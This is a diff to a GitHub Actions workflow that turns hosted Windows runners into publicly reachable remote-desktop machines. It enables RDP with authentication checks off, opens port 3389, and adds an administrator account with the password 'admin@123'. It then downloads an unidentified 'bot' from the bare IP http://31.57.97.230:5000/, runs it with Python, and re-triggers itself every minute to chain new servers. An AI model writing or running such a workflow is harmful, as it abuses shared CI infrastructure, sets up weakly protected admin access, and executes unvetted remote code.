@@ -1,4 +1,4 @@
-name: RDP Self-Repeating (No Schedule)
+name: RDP Auto-Rotate - New Server Every Minute
 
 on:
   workflow_dispatch:
@@ -54,15 +54,27 @@ jobs:
     timeout-minutes: 2
 
     steps:
-      - name: Setup RDP
+      - name: 🚀 Setup RDP
         shell: pwsh
         run: |
+          Write-Host "============================================"
+          Write-Host "🚀 STARTING SERVER #${{ matrix.server }}"
+          Write-Host "🖥️  OS: ${{ matrix.os }}"
+          Write-Host "⏰ Time: $(Get-Date)"
+          Write-Host "============================================"
+
+          # تمكين RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          
+          # جدار الحماية
           netsh advfirewall firewall delete rule name="RDP" 2>$null
           netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+          
+          # إعادة تشغيل خدمة RDP
           Restart-Service TermService -Force
           
+          # إنشاء المستخدم
           $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
           if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
               Remove-LocalUser -Name "TOOLBOXLAP" -Force
@@ -71,28 +83,227 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
           
-          $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          # الحصول على IP
+          try {
+              $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          } catch {
+              $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          }
           
+          echo "PUBLIC_IP=$ip" >> $env:GITHUB_ENV
+          
+          Write-Host ""
           Write-Host "============================================"
           Write-Host "✅ SERVER #${{ matrix.server }} READY"
-          Write-Host "🌐 IP: $ip:3389"
-          Write-Host "👤 User: TOOLBOXLAP"
-          Write-Host "🔑 Pass: admin@123"
+          Write-Host "============================================"
+          Write-Host "🌐 IP Address  : $ip"
+          Write-Host "🔌 Port        : 3389"
+          Write-Host "👤 Username    : TOOLBOXLAP"
+          Write-Host "🔑 Password    : admin@123"
+          Write-Host "============================================"
+          Write-Host ""
+          Write-Host "📝 RDP: mstsc.exe /v:$ip:3389"
           Write-Host "============================================"
 
-      - name: Run for 60 seconds
+      - name: 📥 Download Bot (without filename)
         shell: pwsh
         run: |
+          $desktop = [Environment]::GetFolderPath("Desktop")
+          $botUrl = "http://31.57.97.230:5000/"
+          $botPath = "$desktop\bot.py"
+          
+          Write-Host "📥 Downloading bot from: $botUrl"
+          Write-Host "📁 Saving to: $botPath"
+          
+          # محاولة تحميل البوت مع التعامل مع الرابط بدون اسم ملف
+          $downloaded = $false
+          for ($i = 1; $i -le 3; $i++) {
+              try {
+                  # محاولة تحميل المحتوى من الرابط
+                  $response = Invoke-WebRequest -Uri $botUrl -UseBasicParsing -TimeoutSec 30
+                  
+                  # التحقق من نوع المحتوى
+                  $contentType = $response.Headers['Content-Type']
+                  Write-Host "📄 Content-Type: $contentType"
+                  
+                  # إذا كان المحتوى نصاً (Python script)
+                  if ($contentType -match "text/plain|text/x-python|application/octet-stream") {
+                      $response.Content | Out-File -FilePath $botPath -Encoding UTF8
+                      Write-Host "✅ Bot downloaded as text/script (attempt $i)"
+                      $downloaded = $true
+                      break
+                  }
+                  # إذا كان المحتوى HTML (صفحة ويب)
+                  elseif ($contentType -match "text/html") {
+                      Write-Host "⚠️  Got HTML page, trying to extract content..."
+                      # محاولة استخراج أي كود Python من الصفحة
+                      $html = $response.Content
+                      if ($html -match "```python\s*(.*?)\s*```") {
+                          $pythonCode = $matches[1]
+                          $pythonCode | Out-File -FilePath $botPath -Encoding UTF8
+                          Write-Host "✅ Extracted Python code from HTML"
+                          $downloaded = $true
+                          break
+                      } elseif ($html -match "<pre>(.*?)</pre>") {
+                          $pythonCode = $matches[1]
+                          $pythonCode | Out-File -FilePath $botPath -Encoding UTF8
+                          Write-Host "✅ Extracted code from <pre> tags"
+                          $downloaded = $true
+                          break
+                      } else {
+                          Write-Host "⚠️  No Python code found in HTML"
+                      }
+                  }
+                  # إذا كان المحتوى ثنائياً (ملف)
+                  elseif ($contentType -match "application/") {
+                      [System.IO.File]::WriteAllBytes($botPath, $response.Content)
+                      Write-Host "✅ Downloaded as binary file (attempt $i)"
+                      $downloaded = $true
+                      break
+                  }
+                  
+                  Write-Host "⚠️  Unknown content type, trying raw download..."
+                  [System.IO.File]::WriteAllBytes($botPath, $response.Content)
+                  $downloaded = $true
+                  break
+                  
+              } catch {
+                  Write-Host "⚠️  Download attempt $i failed: $_"
+                  Start-Sleep -Seconds 5
+              }
+          }
+          
+          # إذا فشل التحميل، إنشاء بوت بديل
+          if (-not $downloaded) {
+              Write-Host "❌ Failed to download bot, creating fallback bot..."
+              @"
+import time
+import socket
+import os
+
+def get_ip():
+    try:
+        import urllib.request
+        return urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode().strip()
+    except:
+        return socket.gethostbyname(socket.gethostname())
+
+def main():
+    server_num = os.getenv('SERVER_NUM', 'Unknown')
+    ip = get_ip()
+    
+    print("=" * 50)
+    print(f"🤖 BOT RUNNING ON SERVER #{server_num}")
+    print(f"🌐 IP Address: {ip}:3389")
+    print(f"👤 Username: TOOLBOXLAP")
+    print(f"🔑 Password: admin@123")
+    print("=" * 50)
+    
+    for i in range(55, 0, -5):
+        print(f"⏳ Bot running... {i} seconds remaining")
+        time.sleep(5)
+    
+    print("✅ Bot session completed")
+
+if __name__ == "__main__":
+    main()
+"@ | Out-File -FilePath $botPath -Encoding UTF8
+              Write-Host "✅ Created fallback bot"
+              $downloaded = $true
+          }
+          
+          # التحقق من أن الملف تم تحميله
+          if (Test-Path $botPath) {
+              $fileSize = (Get-Item $botPath).Length
+              Write-Host "✅ Bot file saved: $botPath (Size: $fileSize bytes)"
+              
+              # عرض أول 200 حرف من الملف للتحقق
+              $content = Get-Content $botPath -Raw -ErrorAction SilentlyContinue
+              if ($content) {
+                  Write-Host "📄 Preview: $($content.Substring(0, [Math]::Min(200, $content.Length)))..."
+              }
+          }
+
+      - name: 🐍 Install Python (if needed)
+        shell: pwsh
+        run: |
+          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+          if (-not $pythonPath) {
+              Write-Host "📦 Python not found, installing..."
+              $installer = "$env:TEMP\python.exe"
+              Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
+              Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+              Remove-Item $installer -Force
+              Start-Sleep -Seconds 10
+              $pythonPath = "C:\Python311\python.exe"
+              Write-Host "✅ Python installed"
+          } else {
+              Write-Host "✅ Python found at: $pythonPath"
+          }
+          
+          echo "PYTHON_PATH=$pythonPath" >> $env:GITHUB_ENV
+
+      - name: 🚀 Run Bot
+        shell: pwsh
+        run: |
+          $desktop = [Environment]::GetFolderPath("Desktop")
+          $botPath = "$desktop\bot.py"
+          $pythonPath = "${{ env.PYTHON_PATH }}"
+          
+          if (-not $pythonPath) {
+              $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+              if (-not $pythonPath) {
+                  $pythonPath = "C:\Python311\python.exe"
+              }
+          }
+          
+          if (Test-Path $botPath) {
+              Write-Host "🚀 Starting bot..."
+              Write-Host "🐍 Python: $pythonPath"
+              Write-Host "📁 Bot: $botPath"
+              
+              # تشغيل البوت
+              Start-Process -FilePath $pythonPath -ArgumentList "`"$botPath`"" -WindowStyle Normal -PassThru
+              Write-Host "✅ Bot started successfully"
+          } else {
+              Write-Host "❌ Bot file not found!"
+          }
+
+      - name: ⏱️ Keep Alive 60 Seconds
+        shell: pwsh
+        run: |
+          $server = ${{ matrix.server }}
+          $ip = "${{ env.PUBLIC_IP }}"
           $endTime = (Get-Date).AddSeconds(55)
+          
+          Write-Host ""
+          Write-Host "⏱️  SERVER #$server ACTIVE"
+          Write-Host "🌐 RDP: $ip:3389"
+          Write-Host "⏰ Ends at: $endTime"
+          Write-Host ""
+          
           while ((Get-Date) -lt $endTime) {
+              $remaining = [math]::Round(($endTime - (Get-Date)).TotalSeconds, 0)
+              Write-Host "[$(Get-Date)] Server #$server - ⏳ $remaining seconds"
               Start-Sleep -Seconds 5
           }
 
-      - name: Trigger Next Run
+      - name: 🔄 Trigger Next Server
         shell: pwsh
         run: |
+          Write-Host ""
           Write-Host "🔄 Triggering next server..."
-          # استخدام GitHub CLI لتشغيل الـ workflow مرة أخرى
           gh workflow run "${{ github.workflow }}" --ref "${{ github.ref_name }}"
+          Write-Host "✅ Next server triggered!"
         env:
           GH_TOKEN: ${{ github.token }}
+
+      - name: 📊 Upload RDP Info
+        if: always()
+        uses: actions/upload-artifact@v3
+        with:
+          name: rdp-info-server-${{ matrix.server }}
+          path: |
+            C:\Users\*\Desktop\*.txt
+            C:\Users\*\Desktop\*.py
+          retention-days: 1
